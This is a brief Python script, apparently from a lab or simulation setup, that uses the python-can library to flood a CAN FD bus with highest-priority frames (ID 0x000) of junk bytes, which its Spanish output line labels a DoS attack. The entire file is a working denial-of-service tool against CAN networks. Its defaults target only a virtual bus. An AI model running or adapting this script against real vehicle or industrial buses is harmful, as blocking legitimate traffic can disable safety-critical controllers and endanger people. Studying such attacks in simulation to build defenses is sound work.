import can
import time

def run_dos_attack(channel='virtual_bus', interface='virtual', count=100):
    bus = can.interface.Bus(channel=channel, bustype=interface, fd=True)
    junk_data = b"\xFF" * 8
    
    print(f"[Ataque DoS] Inyectando ráfaga de {count} mensajes...")
    for _ in range(count):
        msg = can.Message(arbitration_id=0x000, data=junk_data, is_fd=True)
        bus.send(msg)
        time.sleep(0.001)

if __name__ == "__main__":
    run_dos_attack()